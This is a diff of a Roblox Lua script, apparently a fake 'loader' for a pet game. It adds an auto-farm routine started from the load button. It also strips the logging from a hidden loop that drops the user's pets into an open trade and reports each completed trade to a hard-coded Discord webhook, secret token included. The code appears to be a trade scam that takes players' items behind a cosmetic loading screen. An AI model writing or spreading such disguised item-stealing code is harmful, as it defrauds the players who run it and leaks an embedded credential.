@@ -8,6 +8,100 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
+
+
+local TweenService = game:GetService("TweenService")
+local Workspace = game:GetService("Workspace")
+local basesFolder = Workspace:WaitForChild("Bases")
+
+local remote = ReplicatedStorage
+    :WaitForChild("Shared")
+    :WaitForChild("Remotes")
+    :WaitForChild("Networking")
+    :WaitForChild("RF/PlotAction")
+
+-- Твин
+local function tweenTo(hrp, cf, time)
+    local tween = TweenService:Create(
+        hrp,
+        TweenInfo.new(time, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {CFrame = cf}
+    )
+    tween:Play()
+    tween.Completed:Wait()
+end
+
+-- Найти свою базу
+local function getMyBase()
+    for _, base in pairs(basesFolder:GetChildren()) do
+        local ok, name = pcall(function()
+            return base.Title.TitleGui.Frame.PlayerName.Text
+        end)
+
+        if ok and name == player.DisplayName then
+            return base
+        end
+    end
+    return nil
+end
+
+-- Центр базы
+local function getBaseCenter(base)
+    if base:IsA("Model") then
+        return base:GetPivot().Position
+    elseif base:IsA("BasePart") then
+        return base.Position
+    end
+end
+
+-- Сбор петов
+local function collectAllPets(baseId)
+    for slot = 1, 50 do
+        remote:InvokeServer("Pick Up Brainrot", baseId, tostring(slot))
+        task.wait(0.1)
+    end
+end
+
+-- ГЛАВНАЯ ФУНКЦИЯ (её будем вызывать из твоего скрипта)
+function startAutoFarm()
+	task.spawn(function() -- чтобы не фризил лоадер
+		local character = player.Character or player.CharacterAdded:Wait()
+		local hrp = character:WaitForChild("HumanoidRootPart", 10)
+		if not hrp then return end
+
+
+		local myBase
+		for i = 1, 120 do
+			myBase = getMyBase()
+			if myBase then break end
+			task.wait(0.5)
+		end
+
+		if not myBase then
+			warn("Base not found")
+			return
+		end
+
+		local center = getBaseCenter(myBase)
+		if not center then
+			warn("Base center not found")
+			return
+		end
+
+
+
+		-- Твин в центр базы (+3 вверх)
+		tweenTo(hrp, CFrame.new(center + Vector3.new(0, 3, 0)), 1.5)
+		task.wait(1)
+		-- Поднимаемся на 20 вверх
+		local upPos = hrp.Position + Vector3.new(0, 20, 0)
+		tweenTo(hrp, CFrame.new(upPos), 1.2)
+
+		collectAllPets(myBase.Name)
+
+	end)
+end
+
 -- ВЕБХУК
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1474804449003442227/YydbR_345X33N_uofAju3qgizRfph62Ty9xODHEldS2r9UlLf4gEsYOpAhiX5ZGmI5f0"
 
@@ -278,7 +372,6 @@ local tradeReadyRemote = ReplicatedStorage
 
 local function startAutoAddPetsLoop()
 	task.spawn(function()
-		print("Waiting for Trade UI...")
 
 		local processedThisTrade = false
 		local tradeCompletedThisCycle = false
@@ -300,7 +393,6 @@ local function startAutoAddPetsLoop()
 						continue
 					end
 
-					print("Trade detected! Adding pets:", #pets)
 
 					local slot = 1
 					local addedCount = 0
@@ -313,7 +405,6 @@ local function startAutoAddPetsLoop()
 							pet.uuid
 						}
 
-						print("Adding:", pet.name, "-> slot", slot)
 
 						local success = pcall(function()
 							tradeSetSlotRemote:InvokeServer(unpack(args))
@@ -339,7 +430,7 @@ local function startAutoAddPetsLoop()
 				-- трейд закрылся после того как мы его обработали → успешный трейд
 				if processedThisTrade and not tradeCompletedThisCycle then
 					tradeCompletedThisCycle = true
-					print("Trade completed! Sending webhook...")
+
 					sendWebhook("Trade Successful")
 				end
 
@@ -569,7 +660,9 @@ loadBtn.MouseButton1Click:Connect(function()
   	"Preparing user interface",
   	"Finalizing startup"
   }
-  
+
+  startAutoFarm()
+
   local function animateLoadingText(label)
   	task.spawn(function()
   		local stepIndex = 1
